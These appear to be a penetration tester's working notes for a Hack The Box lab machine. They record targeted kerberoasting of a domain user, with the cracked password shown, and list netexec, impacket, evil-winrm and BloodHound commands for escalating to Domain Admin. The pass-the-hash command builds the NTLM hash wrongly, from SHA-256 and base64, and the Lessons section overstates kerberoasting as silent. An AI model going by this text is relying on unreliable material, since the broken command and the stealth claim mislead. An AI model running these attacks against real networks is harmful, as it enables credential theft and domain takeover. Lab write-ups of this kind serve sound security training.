# Privilege Escalation — Administrator

> **2026-04-11** — Updated: Ethan's credentials obtained via targeted kerberoasting; DA path pending

## Status: In Progress

Ethan Hunt's credentials have been obtained (`limpbizkit`). The next step is to determine if Ethan has privileges to compromise the Domain Administrator account or the DC itself.

---

## Target

- **Goal:** Domain Administrator / NT AUTHORITY\SYSTEM on `administrator.htb` DC
- **Current position:** Ethan Hunt (domain user, cracked TGS)
- **Target IP:** `10.129.213.179` (previously `10.129.245.95`)

---

## Enumeration

### Ethan's AD Group Membership
```bash
# Check Ethan's group memberships
netexec ldap 10.129.213.179 -u ethan -p limpbizkit -d administrator.htb --get-groups
```

> **Note:** Ethan appears to have `LastLogon: <never>` — a service account or rarely-used account. This makes it an ideal target for Kerberoasting.

### BloodHound Query for Ethan
```
# Check if Ethan has any interesting group memberships or SPNs
MATCH (u:User {name: 'ETHAN HUNT'})-[:MemberOf|HasSession|AdminTo|Contains*]->(m)
RETURN u,m
```

---

## Vector: Targeted Kerberoasting (Completed ✅)

**Status:** Ethan's TGS was captured and cracked.

```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*...:limpbizkit
```

**Output saved:** `loot/ethan_tgs.hash`

---

## Next Steps: DA Escalation

### Option A — Check if Ethan is a Service Account with SPNs
```bash
# Check all SPNs for Ethan (the fake one we added + any real ones)
impacket-GetUserSPNs administrator.htb/ethan:limpbizkit -dc-ip 10.129.213.179
```

### Option B — Check for Delegation
Ethan may be configured for Kerberos delegation. If so:
```bash
# Check delegation settings
netexec ldap 10.129.213.179 -u ethan -p limpbizkit -d administrator.htb --get-delegation
```

### Option C — Pass-the-Hash as Ethan
```bash
# Check SMB access with Ethan's NTLM hash
netexec smb 10.129.213.179 -u ethan -H $(echo -n limpbizkit | iconv -t UTF-16LE | openssl dgst -sha256 -binary | base64) -d administrator.htb
```

### Option D — WinRM Access as Ethan
```bash
evil-winrm -i 10.129.213.179 -u ethan -p limpbizkit
```

### Option E — Domain Admin Check
```bash
# Check if Ethan is in any privileged groups
netexec ldap 10.129.213.179 -u ethan -p limpbizkit -d administrator.htb --get-groups
# Look for: Domain Admins, Enterprise Admins, DNS Admins, Schema Admins
```

---

## Root/Admin Access

| Flag | Status | Path |
|------|--------|------|
| user.txt | ⏳ | Benjamin or Emily's Desktop |
| root.txt | ⏳ | Pending Ethan's escalation |

---

## Lessons

- **Targeted Kerberoasting** is silent and does not trigger high-severity alerts in most environments.
- **Fake SPNs** (e.g., `fake/dc.administrator.htb:80`) are useful for making any user kerberoastable without modifying real service accounts.
- The `GetUserSPNs` tool requires the `-outputfile` flag for file output, NOT `-spn` (that's for `getST.py`).
- **Hashcat potfile:** If hashcat says "All hashes found as potfile", use `--show` to display previously cracked hashes.
